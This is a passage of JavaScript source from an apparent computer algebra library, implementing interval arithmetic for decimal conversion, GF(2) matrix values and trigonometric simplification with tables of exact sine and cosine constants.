  this.c = new FixedPointContext(this.scalingCoefficient);
};
Interval.Context.prototype.negate = function (x) {
  if (this.c.compareTo(x.a, x.b) === 0) {
    return this.c.negate(x.a);
  }
  return new Interval(this.c.negate(x.b).a, this.c.negate(x.a).b);
};
Interval.Context.prototype.add = function (x, y) {
  if (this.c.compareTo(x.a, x.b) === 0 && this.c.compareTo(y.a, y.b) === 0) {
    return this.c.add(x.a, y.a);
  }
  return new Interval(this.c.add(x.a, y.a).a, this.c.add(x.b, y.b).b);
};
Interval.Context.prototype.subtract = function (x, y) {
  return this.add(x, this.negate(y));
};
Interval.Context.prototype.multiply = function (x, y) {
  if (this.c.compareTo(x.a, x.b) === 0 && this.c.compareTo(y.a, y.b) === 0) {
    return this.c.multiply(x.a, y.a);
  }
  var a = this.c.multiply(x.a, y.a);
  var b = this.c.multiply(x.a, y.b);
  var c = this.c.multiply(x.b, y.a);
  var d = this.c.multiply(x.b, y.b);
  return new Interval(this.c.min(this.c.min(a.a, b.a),
                                 this.c.min(c.a, d.a)),
                      this.c.max(this.c.max(a.b, b.b),
                                 this.c.max(c.b, d.b)));
};
Interval.Context.prototype.divide = function (x, y) {
  var zero = this.c.fromInteger(BigInteger.BigInt(0));
  if (this.c.compareTo(y.a, zero.b) <= 0 && this.c.compareTo(y.b, zero.a) >= 0) {
    //throw new RangeError();
    return "CANNOT_DIVIDE";//TODO: FIX
  }
  if (this.c.compareTo(x.a, x.b) === 0 && this.c.compareTo(y.a, y.b) === 0) {
    return this.c.divide(x.a, y.a);
  }
  var a = this.c.divide(x.a, y.a);
  var b = this.c.divide(x.a, y.b);
  var c = this.c.divide(x.b, y.a);
  var d = this.c.divide(x.b, y.b);
  return new Interval(this.c.min(this.c.min(a.a, b.a),
                                 this.c.min(c.a, d.a)),
                      this.c.max(this.c.max(a.b, b.b),
                                 this.c.max(c.b, d.b)));
};
Interval.Context.prototype.nthRoot = function (A, n) {
  var c = this.scalingCoefficient;
  var sA = BigInteger.multiply(A, BigInteger.exponentiate(c, BigInteger.BigInt(n)));

  var x0 = nthRoot(sA, BigInteger.BigInt(n));
  var x1 = BigInteger.lessThan(BigInteger.exponentiate(x0, BigInteger.BigInt(n)), sA) ? BigInteger.add(x0, BigInteger.BigInt(1)) : x0;

  var t = this.c.fromInteger(c);
  var a = this.c.divide(this.c.fromInteger(x0).a, t.b).a;
  var b = this.c.divide(this.c.fromInteger(x1).b, t.a).b;
  return new Interval(a, b);
};
Interval.Context.prototype.exp = function (x) {

  function expp(a, b, scaling) {
    // a > 0, b > 0, scaling > 0
    var y = BigInteger.BigInt(1);
    var t = BigInteger.BigInt(1);
    var u = BigInteger.BigInt(1);
    var k = BigInteger.BigInt(0);
    var denominator = BigInteger.BigInt(1);
    while (BigInteger.greaterThan(BigInteger.multiply(BigInteger.multiply(t, scaling), BigInteger.BigInt(2)), denominator) ||
           BigInteger.greaterThan(BigInteger.multiply(a, BigInteger.BigInt(2)), BigInteger.multiply(b, k))) {
      t = BigInteger.multiply(t, a);
      k = BigInteger.add(k, BigInteger.BigInt(1));
      y = BigInteger.add(BigInteger.multiply(y, BigInteger.multiply(k, b)), t);
      denominator = BigInteger.multiply(denominator, BigInteger.multiply(k, b));
    }
    return {
      numerator: BigInteger.multiply(y, scaling),
      denominator: denominator
    };
  }
  function exp(a, b, scaling) {
    if (BigInteger.lessThan(a, BigInteger.BigInt(0))) {
      var tmp = expp(BigInteger.unaryMinus(a), b, scaling);
      return BigInteger.divide(BigInteger.multiply(BigInteger.multiply(scaling, scaling), tmp.denominator), tmp.numerator);
    }
    var tmp = expp(a, b, scaling);
    return BigInteger.divide(tmp.numerator, tmp.denominator);
  }

  var a = exp(x.a, this.scalingCoefficient, this.scalingCoefficient);
  var b = exp(x.b, this.scalingCoefficient, this.scalingCoefficient);
  b = BigInteger.add(b, BigInteger.BigInt(1));
  return new Interval(a, b);
};
Interval.Context.prototype.fromInteger = function (a) {
  return this.c.fromInteger(a);
};
Interval.Context.prototype.fromIntegers = function (a, b) {
  return new Interval(this.c.fromInteger(a).a, this.c.fromInteger(b).b);
};
//?
Interval.Context.prototype.toInteger = function (x) {
  if (this.c.compareTo(x.a, x.b) === 0) {
    return {sign: this.c.sign(x.a), integer: this.c.round(x.a)};
  }
  var signA = this.c.sign(x.a);
  var signB = this.c.sign(x.b);
  if (signA === signB) {
    var candidateA = this.c.round(x.a);
    var candidateB = this.c.round(x.b);
    if (!BigInteger.lessThan(candidateA, candidateB)) {
      return {sign: signA, integer: candidateA};
    }
  }
  return {sign: undefined, integer: undefined};
};
Interval.prototype.toString = function () {
  return "[" + this.a.toString() + ";" + this.b.toString() + "]";
};

var evaluateExpression = function (e, context) {
  if (e instanceof Expression.Integer) {
    var n = e.value;
    return context.fromInteger(n);
  } else if (e instanceof Expression.NthRoot) {
    var a = e.a;
    var n = e.n;
    if (a instanceof Expression.Integer) {
      return context.nthRoot(a.value, n);
    }
    var y = evaluateExpression(e.a, context);
    if (y === "CANNOT_DIVIDE" || y == null) {
      return y;
    }
    //TODO: debug
    var yy = new Interval(context.nthRoot(y.a, n).a, context.nthRoot(y.b, n).b);
    var s = context.nthRoot(context.scalingCoefficient, n);
    yy = context.divide(yy, context.multiply(Interval.degenerate(context.scalingCoefficient), s));
    return yy;
  } else if (e instanceof Expression.BinaryOperation) {
    if (e.a === Expression.E && e.getS() === "^") {
      var b = evaluateExpression(e.b, context);
      if (b === "CANNOT_DIVIDE") {
        return b;
      }
      return context.exp(b);
    }
    
    var a = evaluateExpression(e.a, context);
    var b = evaluateExpression(e.b, context);
    if (a === "CANNOT_DIVIDE") {
      return a;
    }
    if (b === "CANNOT_DIVIDE") {
      return b;
    }
    if (a != undefined && b != undefined) {
      var operator = e.getS();
      if (operator === "+") {
        return context.add(a, b);
      } else if (operator === "-") {
        return context.subtract(a, b);
      } else if (operator === "*") {
        return context.multiply(a, b);
      } else if (operator === "/") {
        return context.divide(a, b);
      } else if (operator === "^") { // Expression.PolynomialRoot^3
        var result = a;
        var n = e.b.toNumber();//TODO: FIX!
        for (var i = 1; i < n; i += 1) {
          result = context.multiply(result, a);
        }
        return result;
      }
    }
  } else if (e instanceof Expression.PolynomialRoot) {
    var i = e.polynomial.getZero(e.interval, context.precision);
    var cd = i.a.getDenominator().lcm(i.b.getDenominator());
    return context.divide(context.fromIntegers(i.a.getNumerator().multiply(cd.divide(i.a.getDenominator())).value,
                                               i.b.getNumerator().multiply(cd.divide(i.b.getDenominator())).value),
                          context.fromInteger(cd.value));
  }
  return undefined;
};

var decimalToString = function (sign, number) {
  return (sign < 0 ? "-" : "") + number;
};

var complexToString = function (real, imaginary) {
  return real + (imaginary.indexOf('-') === -1 ? '+' : '') + imaginary + 'i';
};

var digitsToDecimalNumber = function (sign, value, fractionDigits, decimalToStringCallback) {
  // TODO: fix
  // new Intl.NumberFormat().format(1.1)
  // "<math decimalpoint=\"" + decimalSeparator + "\"></math>" -?
  var digits = (BigInteger.lessThan(value, BigInteger.BigInt(0)) ? BigInteger.unaryMinus(value) : value).toString();
  var decimalSeparator = ".";
  var zeros = "";
  for (var i = 0; i < fractionDigits; i += 1) {
    zeros += "0";
  }
  var number = (fractionDigits === 0 ? digits : (digits.slice(0, -fractionDigits) || "0") + decimalSeparator + (zeros + digits).slice(-fractionDigits));
  return decimalToStringCallback(sign, number);
};

  //? ((n * 10**(fractionDigits + 1)) ~/ d + 5) ~/ 10

var toDecimalStringInternal = function (expression, fractionDigits, decimalToStringCallback, complexToStringCallback) {
  decimalToStringCallback = decimalToStringCallback || decimalToString;
  complexToStringCallback = complexToStringCallback || complexToString;
  
  if (expression instanceof Expression.Division || expression instanceof Expression.Addition) {
    var numerator = expression.getNumerator();//.unwrap();
    var denominator = expression.getDenominator();//.unwrap();
    if (denominator instanceof Expression.Integer) {
      if (numerator instanceof Expression.Addition || numerator instanceof Expression.Multiplication || numerator instanceof Expression.Complex) {
        var realValue = Expression.ZERO;
        var imaginaryValue = Expression.ZERO;
        var ok = true;
        var e = numerator;
        for (var additions = e.summands(), x = additions.next().value; x != null; x = additions.next().value) {
          var c = null;
          var r = Expression.ONE;
          for (var multiplications = x.factors(), y = multiplications.next().value; y != null; y = multiplications.next().value) {
            if (c == null && y instanceof Expression.Complex) {
              c = y;
            } else if (y instanceof Expression.NthRoot || y instanceof Expression.Integer) {//TODO: ?
              r = r.multiply(y);
            } else {
              ok = false;
            }
          }
          realValue = realValue.add(r.multiply(c == null ? Expression.ONE : c.real));
          imaginaryValue = imaginaryValue.add(c != null ? r.multiply(c.imaginary) : Expression.ZERO);
        }
        if (ok && !imaginaryValue.equals(Expression.ZERO)) {
          realValue = realValue.divide(denominator);
          imaginaryValue = imaginaryValue.divide(denominator);
          var real = toDecimalStringInternal(realValue, fractionDigits, decimalToStringCallback, complexToStringCallback);
          var imaginary = toDecimalStringInternal(imaginaryValue, fractionDigits, decimalToStringCallback, complexToStringCallback);
          return complexToStringCallback(realValue.equals(Expression.ZERO) ? '' : real, imaginaryValue.equals(Expression.ONE) ? '' : imaginary);
        }
      }
    }
  }
  //TODO: remove - ?
  if (expression instanceof Expression.NthRoot) {
    var a = expression.a;//.unwrap();
    if (a instanceof Expression.Integer) {
      var A = a.value;
      var n = expression.n;
      var scale = BigInteger.exponentiate(BigInteger.BigInt(10), BigInteger.BigInt(fractionDigits));
      var sA = BigInteger.multiply(A, BigInteger.exponentiate(scale, BigInteger.BigInt(n)));

      var x0 = nthRoot(sA, BigInteger.BigInt(n));
      var x1 = BigInteger.lessThan(BigInteger.exponentiate(x0, BigInteger.BigInt(n)), sA) ? BigInteger.add(x0, BigInteger.BigInt(1)) : x0;

      // root - x0 < x1 - root
      // 2root < x0 + x1
      // 2**n * A < (x0 + x1)**n
      var nearest = BigInteger.lessThan(BigInteger.multiply(BigInteger.exponentiate(BigInteger.BigInt(2), BigInteger.BigInt(n)), sA), BigInteger.exponentiate(BigInteger.add(x0, x1), BigInteger.BigInt(n))) ? x0 : x1;
      return toDecimalStringInternal(new Expression.Division(new Expression.Integer(nearest), new Expression.Integer(scale)), fractionDigits, decimalToStringCallback, complexToStringCallback);
    }
  }
  //---
  if (!Expression.has(expression, Expression.Symbol) &&
      !Expression.has(expression, Expression.NthRoot) &&
      !Expression.has(expression, Expression.PolynomialRoot) &&
      !(expression instanceof Expression.Integer) &&
      !(expression instanceof Expression.Division)) {
    throw new TypeError("toDecimalString:" + fractionDigits + ":" + expression.toString({}));
  }
  if (fractionDigits < 0 || fractionDigits > 9007199254740991) {
    throw new RangeError();
  }
  var sign = 0;
  var result = undefined;
  var guessedPrecision = 0;
  var scale = BigInteger.exponentiate(BigInteger.BigInt(10), BigInteger.BigInt(fractionDigits));
  while (result == undefined) {
    var context = new Interval.Context(guessedPrecision);
    var x = evaluateExpression(expression, context);
    if (x == undefined) {
      return undefined;
    }
    if (x !== "CANNOT_DIVIDE") { // continue the loop otherwise
      x = context.multiply(context.fromInteger(scale), x);
      var tmp = context.toInteger(x);
      sign = tmp.sign;
      result = tmp.integer;
    }
    guessedPrecision = (guessedPrecision === 0 ? 1 : guessedPrecision * 2);
  }
  return digitsToDecimalNumber(sign, result, fractionDigits, decimalToStringCallback);
};

self.toDecimalStringInternal = toDecimalStringInternal;

})();
(function () {
"use strict";
  

  function GF2(a) {
    this.a = a;
  }
  GF2.prototype = Object.create(Expression.prototype);
  
  Expression.GF2 = GF2;
  Expression.GF2.prototype.toString = function (options) {
    return "GF2(" + this.a.toString(Expression.setTopLevel(true, options)) + ")";
  };

  function GF2Value(value) {
    //Expression.call(this);
    this.value = value;
  }
  Expression.GF2Value = GF2Value;

  GF2Value.prototype = Object.create(Expression.prototype);
  Expression.GF2Value.prototype.equals = function (b) {
    if (Expression.ZERO === b) {
      return this.value === 0;//!
    }
    return false;//?
  };
  Expression.GF2Value.prototype.negate = function () {
    return new GF2Value(this.value === 0 ? 0 : 2 - this.value);
  };

  GF2Value.prototype.add = function (x) {
    if (x === Expression.ZERO) {
      return new GF2Value(this.value);
    }
    if (!(x instanceof GF2Value)) {
      throw new RangeError();
    }
    var v = this.value - 2 + x.value;
    return new GF2Value(v >= 0 ? v : v + 2);
  };
  
  GF2Value.prototype.multiply = function (x) {
    if (x === Expression.ZERO) {
      return new GF2Value(0);
    }
    if (!(x instanceof GF2Value)) {
      throw new RangeError();
    }
    var v = this.value * x.value;
    return new GF2Value(v - 2 * Math.floor(v / 2));
  };
  
  GF2Value.prototype.divide = function (x) {
    //if (!(x instanceof GF2Value)) {
    //  throw new RangeError();
    //}
    return new GF2Value(this.value);
  };

  Expression.prototype.GF2 = function () {
    var x = this;
    if (!(x instanceof Expression.Matrix)) {
      throw new RangeError("NotSupportedError");//?
    }
    return new Expression.Matrix(x.matrix.map(function (e, i, j) {
      return new Expression.GF2Value(e.equals(Expression.ZERO) ? 0 : 1);
    }));
  };

  GF2Value.prototype.toString = function (options) {
    return this.value.toString();
  };

})();
(function () {
"use strict";
  

  var Integer = Expression.Integer;
  var Addition = Expression.Addition;
  var Multiplication = Expression.Multiplication;
  var Division = Expression.Division;
  var Exponentiation = Expression.Exponentiation;
  var BinaryOperation = Expression.BinaryOperation;

var separateSinCos = function (e) {
  if (!(e instanceof Multiplication)) {
    throw new TypeError();
  }
  var sinCos = undefined;
  var other = undefined;
  var x = e;
  for (var multiplications = x.factors(), y = multiplications.next().value; y != null; y = multiplications.next().value) {
    var v = y;
    if (v instanceof Sin || v instanceof Cos || 
        (v instanceof Exponentiation && (v.a instanceof Sin || v.a instanceof Cos))) {
      sinCos = sinCos == undefined ? v : sinCos.multiply(v);
    } else {
      other = other == undefined ? v : other.multiply(v);
    }
  }
  return {
    sinCos: sinCos == undefined ? Expression.ONE : sinCos,
    other: other == undefined ? Expression.ONE : other
  };
};

var expandMainOp = function (u) {
  return u;
};

var contractTrigonometryInternal = function (a, b) {
  // sin(a) * sin(b) = (cos(a - b) - cos(a + b)) / 2
  // sin(a) * cos(b) = (sin(a + b) + sin(a - b)) / 2
  // cos(a) * sin(b) = (sin(a + b) - sin(a - b)) / 2
  // cos(a) * cos(b) = (cos(a - b) + cos(a + b)) / 2
  var ax = a.a;
  var bx = b.a;
  if (a instanceof Sin && b instanceof Sin) {
    return ax.subtract(bx).cos().divide(Expression.TWO).subtract(ax.add(bx).cos().divide(Expression.TWO));
  }
  if (a instanceof Sin && b instanceof Cos) {
    return ax.add(bx).sin().divide(Expression.TWO).add(ax.subtract(bx).sin().divide(Expression.TWO));
  }
  if (a instanceof Cos && b instanceof Sin) {
    return ax.add(bx).sin().divide(Expression.TWO).subtract(ax.subtract(bx).sin().divide(Expression.TWO));
  }
  if (a instanceof Cos && b instanceof Cos) {
    return ax.subtract(bx).cos().divide(Expression.TWO).add(ax.add(bx).cos().divide(Expression.TWO));
  }
  throw new TypeError();
};

// page 306
var contractTrigonometryPower = function (u) {
  var b = u.a;
  if (!(b instanceof Sin) && !(b instanceof Cos)) {
    return u;
  }
  var e = contractTrigonometryInternal(b, b).multiply(u.divide(b.multiply(b)));
  return contractTrigonometryRules(e.getNumerator()).divide(e.getDenominator());
};

// page 318
var contractTrigonometryProduct = function (u) {
  var i = u.factors();
  var a = i.next().value;
  var b = i.next().value;
  var rest = Expression.ONE;
  var y = i.next().value;
  while (y != null) {
    rest = y.multiply(rest);//TODO: fix
    y = i.next().value;
  }

  if (a instanceof Exponentiation) {
    a = contractTrigonometryPower(a);
    return contractTrigonometryRules(a.multiply(b).multiply(rest));
  }
  if (b instanceof Exponentiation) {
    b = contractTrigonometryPower(b);
    return contractTrigonometryRules(a.multiply(b).multiply(rest));
  }
  // (a instanceof Sin || a instanceof Cos) && (b instanceof Sin || b instanceof Cos)
  var c = contractTrigonometryInternal(a, b);

  return contractTrigonometryRules(c.multiply(rest));
};

// page 317
var contractTrigonometryRules = function (u) {
  var v = expandMainOp(u);
  if (v instanceof Exponentiation) {
    return contractTrigonometryPower(v);
  }
  if (v instanceof Multiplication) {
    var tmp = separateSinCos(v);
    var c = tmp.other;
    var d = tmp.sinCos;
    if (d.equals(Expression.ONE)) {
      return v;
    }
    if (d instanceof Sin || d instanceof Cos) {
      return v;
    }
    if (d instanceof Exponentiation) {
      return expandMainOp(c.multiply(contractTrigonometryPower(d)));
    }
    if (d instanceof Multiplication) {
      return expandMainOp(c.multiply(contractTrigonometryProduct(d)));
    }
    throw new TypeError();
  }
  if (v instanceof Addition) {
    var s = Expression.ZERO;
    var e = v;
    for (var additions = e.summands(), x = additions.next().value; x != null; x = additions.next().value) {
      if (x instanceof Multiplication || x instanceof Exponentiation) {
        s = s.add(contractTrigonometryRules(x));
      } else {
        s = s.add(x);
      }
    }
    return s;
  }
  return v;
};

var map = function (f, u) {
  if (u instanceof Integer) {
    return f(u);
  }
  if (u instanceof Addition) {
    return f(u.a).add(f(u.b));
  }
  if (u instanceof Multiplication) {
    return f(u.a).multiply(f(u.b));
  }
  if (u instanceof Division) {
    return f(u.a).divide(f(u.b));
  }
  if (u instanceof Exponentiation) {
    return f(u.a).pow(f(u.b));
  }
  if (u instanceof Sin) {
    return f(u.a).sin();
  }
  if (u instanceof Cos) {
    return f(u.a).cos();
  }
  if (u instanceof Expression.Matrix) {
    return new Expression.Matrix(u.matrix.map(function (e, i, j) {
      return map(f, e);
    }));
  }
  if (u instanceof Expression.Polynomial) {//TODO: test case
    return new Expression.Polynomial(u.polynomial.map(function (c, d) {
      return map(f, c);
    }));
  }
  if (u instanceof Expression.GF2Value) {
    return u;
  }
  if (u instanceof Expression.NthRoot) {
    return u;
  }
  if (u instanceof Expression.Negation) {
    return u;//?
  }
  if (u instanceof Expression.Complex) {
    return u;//?
  }
  if (u instanceof Expression.NonSimplifiedExpression) {
    //TODO: fix
    return u;//?
  }
  if (u instanceof Expression.Degrees) {
    return u;//?
  }
  throw new TypeError();
};

// page 303

var expandTrigonometryRulesInternal = function (a, b, type) {
  if (type === "cos") {
    // cos(a + b) = cos(a) * cos(b) - sin(a) * sin(b)
    return expandTrigonometryRules(a, "cos").multiply(expandTrigonometryRules(b, "cos")).subtract(expandTrigonometryRules(a, "sin").multiply(expandTrigonometryRules(b, "sin")));
  }
  if (type === "sin") {
    // sin(a + b) = sin(a) * cos(b) + cos(a) * sin(b)
    return expandTrigonometryRules(a, "sin").multiply(expandTrigonometryRules(b, "cos")).add(expandTrigonometryRules(a, "cos").multiply(expandTrigonometryRules(b, "sin")));
  }
  throw new TypeError(type);
};

var expandTrigonometryRules = function (A, type) {
  if (A instanceof Addition) {
    return expandTrigonometryRulesInternal(A.a, A.b, type);
  } else if (A instanceof Multiplication) {
    var a = A.a;
    var b = A.b;
    if (!(a instanceof Integer)) {
      throw new TypeError();
    }
    if (a.compareTo(Expression.ONE.negate()) === 0) {
      if (type === "cos") {
        return expandTrigonometryRules(b, type);
      }
      if (type === "sin") {
        return expandTrigonometryRules(b, type).negate();
      }
    }
    var c = a.compareTo(Expression.ZERO) > 0 ? Expression.ONE : Expression.ONE.negate();
    return expandTrigonometryRulesInternal(c.multiply(b), a.subtract(c).multiply(b), type);
  } else if (A instanceof Division) {
    var t = simplifyConstantValue(A, type);
    if (t != null) {
      return t;
    }
    var a = A.a;
    var b = A.b;
    if (a instanceof Addition) {
      return expandTrigonometryRulesInternal(a.a.divide(b), a.b.divide(b), type);
    }
  }
  if (A instanceof Expression.Symbol || A instanceof Expression.Degrees) {
    if (type === "cos") {
      return A.cos();
    }
    if (type === "sin") {
      return A.sin();
    }
  }
  throw new TypeError();
};

// CA and SC, EA, p. 303

var expandTrigonometry = function (u) {
  if (u instanceof Integer || u instanceof Expression.Symbol) {
    return u;
  }
  var v = map(expandTrigonometry, u);
  if (v instanceof Sin) {
    return expandTrigonometryRules(v.a, "sin");
  }
  if (v instanceof Cos) {
    return expandTrigonometryRules(v.a, "cos");
  }
  return v;
};

var contractTrigonometry = function (u) {
  if (u instanceof Integer || u instanceof Expression.Symbol) {
    return u;
  }
  var v = map(contractTrigonometry, u);
  if (v instanceof Division) {//
    return contractTrigonometry(v.getNumerator()).divide(v.getDenominator());
  }
  if (v instanceof Multiplication || v instanceof Exponentiation || v instanceof Addition) {//! Addition - ?
    return contractTrigonometryRules(v);
  }
  if (v instanceof Cos || v instanceof Sin) {
    return v;
  }
  if (v instanceof Integer) {
    return v;
  }
  return v;//?
  //throw new TypeError();
};

// page 323

var hasTrigonometry = function (e) {//TODO: remove
  if (e instanceof BinaryOperation) {
    return hasTrigonometry(e.a) || hasTrigonometry(e.b);
  }
  return e instanceof Cos || e instanceof Sin;
};

var simplifyTrigonometry = function (u) {
  if (!hasTrigonometry(u)) {
    return u;
  }
  var n = u.getNumerator();
  n = expandTrigonometry(n);
  n = contractTrigonometry(n);
  var d = u.getDenominator();
  d = expandTrigonometry(d);
  d = contractTrigonometry(d);
  return n.divide(d);
};

Expression.simplifyTrigonometry = simplifyTrigonometry;//?


function Sin(x) {
  Expression.Function.call(this, "sin", x);
}
Sin.prototype = Object.create(Expression.Function.prototype);

//TODO: new 2017-04-26
var simplifyConstantValueInternal = function (d) {
  if (d >= +360 || d <= -360) {
    throw new RangeError();
  }
  if (d < 0) {
    d += 360;
  }
  if (d >= 180) {
    d = d - 180;
    var tmp = simplifyConstantValueInternal(d);
    return tmp == null ? null : tmp.negate();
  }
  if (d > 90) {
    d = 180 - d;
    var tmp = simplifyConstantValueInternal(d);
    return tmp == null ? null : tmp.negate();
  }

  function f(d) {
    // https://en.wikipedia.org/wiki/Trigonometric_constants_expressed_in_real_radicals#Calculated_trigonometric_values_for_sine_and_cosine
    var x = simplifyConstantValueInternal(d * 2);
    return x == null ? null : Expression.TWO.add(Expression.TWO.multiply(x)).squareRoot().divide(Expression.TWO);
  }
  function ff(x) {//TODO: a+b
    // cos(2x) = 2cos^2(x)-1
    var y = simplifyConstantValueInternal(x / 2);
    return Expression.TWO.multiply(y.multiply(y)).subtract(Expression.ONE);
  }

  if (d === 3) {
    // https://en.wikipedia.org/wiki/Trigonometric_constants_expressed_in_real_radicals#3°:_regular_hexacontagon_(60-sided_polygon)
    return RPN('(2*(5^0.5+1)^0.5*5^(1/4)+2*(3*5^0.5+3)^0.5*5^(1/4)+2^0.5-6^0.5-10^0.5+30^0.5)/16');
  }
  if (d === 6) {
    return ff(d);
  }
  if (d === 12) {
    return ff(d);
  }
  if (d === 24) {
    // https://en.wikipedia.org/wiki/Trigonometric_constants_expressed_in_real_radicals#24°:_sum_12°_+_12°
    //return RPN('(sqrt(6*(5-sqrt(5)))+sqrt(5)+1)/8');
    return ff(d);
  }
  if (d === 42) {
    // cos(42) = sin(48) = 2*sin(24)*cos(24)
    return RPN('2*sin(24)*cos(24)');
  }
  if (d === 9) {
    return RPN('cos(3)cos(6)-sin(3)sin(6)');
  }
  if (d === 21) {
    return RPN('cos(3)cos(18)-sin(3)sin(18)');
  }
  if (d === 27) {
    return RPN('cos(3)cos(24)-sin(3)sin(24)');
  }
  if (d === 33) {
    return RPN('cos(3)cos(30)-sin(3)sin(30)');
  }
  if (d === 39) {
    return RPN('cos(3)cos(36)-sin(3)sin(36)');
  }

  if (d === 7.5) {
    // cos(7.5) = cos(67.5 - 60) = cos(3pi/8)*cos(-60) - sin(3pi/8)*sin(-60)
    return RPN('cos(3pi/8)*cos(-60) - sin(3pi/8)*sin(-60)');
  }
  if (d === 90 - 7.5) {
    // sin(7.5) = sin(67.5 - 60) = sin(3pi/8)*cos(-60) + cos(3pi/8)*sin(-60)
    return RPN('sin(3pi/8)*cos(-60) + cos(3pi/8)*sin(-60)');
  }
  if (d === 90 - 52.5) {
    // sin(52.5) = sin(67.5 - 15) = sin(3pi/8)*cos(-15) + cos(3pi/8)*sin(-15)
    return RPN('sin(3pi/8)*cos(-15) + cos(3pi/8)*sin(-15)');
  }
  if (d === 52.5) {
    // cos(52.5) = cos(67.5 - 15) = cos(3pi/8)*cos(-15) - sin(3pi/8)*sin(-15)
    return RPN('cos(3pi/8)*cos(-15) - sin(3pi/8)*sin(-15)');
  }

  if (d > 0 && d < 45) {
    return f(d);
  }

  if (d === 0) {
    return Expression.ONE;
  }

  // https://en.wikipedia.org/wiki/Sine
  if (d === 90 - 42) {
    return RPN('(sqrt(30+sqrt(180))-sqrt(5)+1)/8');
  }
  if (d === 90 - 39) {
    return RPN('((2-sqrt(12))*sqrt(5-sqrt(5))+(sqrt(10)+sqrt(2))*(sqrt(3)+1))/16');
  }
  if (d === 90 - 33) {
    // sin(33) = sin(15)cos(18)+sin(18)cos(15)
    return simplifyConstantValueInternal(15).multiply(simplifyConstantValueInternal(90 - 18)).add(simplifyConstantValueInternal(18).multiply(simplifyConstantValueInternal(90 - 15)));
  }
  if (d === 63) {
    return RPN('(sqrt(20+sqrt(80))-sqrt(10)+sqrt(2))/8');
  }
  if (d === 66) {
    return RPN('(sqrt(3)+sqrt(15)-sqrt(10-sqrt(20)))/8');
  }
  if (d === 69) {
    return RPN('((2+sqrt(12))*sqrt(5-sqrt(5))-(sqrt(10)+sqrt(2))*(sqrt(3)-1))/16');
  }
  if (d === 78) {
    return RPN('(sqrt(10+sqrt(20))+sqrt(3)-sqrt(15))/8');
  }
  if (d === 81) {
    return RPN('(sqrt(10)+sqrt(2)-sqrt(20-sqrt(80)))/8');
  }
  if (d === 84) {
    return RPN('(sqrt(30-sqrt(180))-sqrt(5)-1)/8');
  }
  if (d === 87) {
    return RPN('((2-sqrt(12))*sqrt(5+sqrt(5))+(sqrt(10)-sqrt(2))(sqrt(3)+1))/16');
  }
  //TODO: 
  //TODO: sin(48)

  if (d === 15) {
    return f(d);
  }
  if (d === 22.5) {
    return f(d);
  }
  if (d === 30) {
    return Expression.ONE.add(Expression.TWO).squareRoot().divide(Expression.TWO);
  }
  if (d === 45) {
    return Expression.ONE.divide(Expression.TWO.squareRoot());
  }
  if (d === 60) {
    return Expression.ONE.divide(Expression.TWO);
  }
  if (d === 67.5) {
    return f(d).negate();//?
  }
  if (d === 75) {
    return f(d);
  }
  if (d === 90) {
    return Expression.ZERO;
  }
  if (d === 18) {
    var phi = Expression.ONE.add(Expression.Integer.fromNumber(5).squareRoot()).divide(Expression.TWO);
    return Expression.TWO.add(phi).squareRoot().divide(Expression.TWO);
  }
  if (d === 36) {
    return Expression.TWO.add(Expression.TWO).add(Expression.ONE).squareRoot().add(Expression.ONE).divide(Expression.TWO.add(Expression.TWO));
  }

  if (d === 54) {
    // http://www.maths.surrey.ac.uk/hosted-sites/R.Knott/Fibonacci/simpleTrig.html#section4.2
    var phi = Expression.ONE.add(Expression.Integer.fromNumber(5).squareRoot()).divide(Expression.TWO);
    return Expression.TWO.subtract(Expression.TWO.subtract(phi).squareRoot()).squareRoot().divide(Expression.TWO);
  }
  if (d === 72) {
    return Expression.TWO.add(Expression.TWO).add(Expression.ONE).squareRoot().subtract(Expression.ONE).divide(Expression.TWO.add(Expression.TWO));
  }

  return undefined;
};

var simplifyConstantValue = function (x, type) {
  var a = undefined;
  var b = undefined;
  if (x instanceof Integer && x.compareTo(Expression.ZERO) === 0) {
    a = Expression.ZERO;
    b = Expression.ONE;
  } else if (x === Expression.PI) {
    a = Expression.ONE;
    b = Expression.ONE;
  } else if (x instanceof Multiplication && x.a instanceof Integer && x.b === Expression.PI) {
    a = x.a;
    b = Expression.ONE;
  } else if (x instanceof Division && x.b instanceof Integer && x.a === Expression.PI) {
    a = Expression.ONE;
    b = x.b;
  } else if (x instanceof Division && x.b instanceof Integer && x.a instanceof Multiplication && x.a.a instanceof Integer && x.a.b === Expression.PI) {
    a = x.a.a;
    b = x.b;
  } else if (x instanceof Expression.Degrees) {
    var t = x.value.simplify();
    if (t instanceof Integer) {
      a = t;
      b = Integer.fromNumber(180);
    } else {
      throw new TypeError();
    }
  }
  if (a != undefined && b != undefined) {
    b = b.toNumber();
    var k = 2;
    if (b >= 1 && b <= 180 && (180 * k) % b === 0) {
      var d = a.multiply(Integer.fromNumber(Math.floor((180 * k) / b))).remainder(Integer.fromNumber(360 * k)).toNumber();
      d /= k;
      if (type === "sin") {
        d = 90 - d;
        if (d >= 360 - 90) {
          d -= 360;
        }
      }
      return simplifyConstantValueInternal(d);
    }
  }
  return undefined;
};

var isArgumentValid = function (x, type) {
  if (x instanceof Expression.Degrees) {
    return true;
  }
  if (x instanceof Expression.Symbol) {
    return Expression.isScalar(x);
  }
  if (x instanceof Addition) {
    return isArgumentValid(x.a, type) && isArgumentValid(x.b, type);
  }
  if (x instanceof Multiplication) {
    return x.a instanceof Integer && Expression.isScalar(x.b) && x.b instanceof Expression.Symbol;
  }
  if (x instanceof Division) {
    if (x.b instanceof Integer && x.a === Expression.PI) {
      return true;
    }
    if (x.b instanceof Integer && x.a instanceof Multiplication && x.a.b === Expression.PI) {
      return true;
    }
    return x.b instanceof Integer && x.a instanceof Addition && isArgumentValid(x.a.a.divide(x.b), type) && isArgumentValid(x.a.b.divide(x.b), type);
  }
  return false;
};

Expression.prototype.sin = function () {
  var x = this;
  var t = simplifyConstantValue(x, "sin");
  if (t != undefined) {
    return t;
  }
  if (x.isNegative()) {
    return x.negate().sin().negate();
  }
  if (!isArgumentValid(x, "sin")) {
    throw new RangeError("NotSupportedError");
  }
  return new Sin(x);
};

function Cos(x) {
  Expression.Function.call(this, "cos", x);
}
Cos.prototype = Object.create(Expression.Function.prototype);

Expression.prototype.cos = function () {
  var x = this;
  var t = simplifyConstantValue(x, "cos");
  if (t != undefined) {
    return t;
  }
  if (x.isNegative()) {
    return x.negate().cos();
  }
  if (!isArgumentValid(x, "cos")) {
    throw new RangeError("NotSupportedError");
  }
  return new Cos(x);
};

Expression.simplifications.push(simplifyTrigonometry);

Expression.Sin = Sin;
Expression.Cos = Cos;

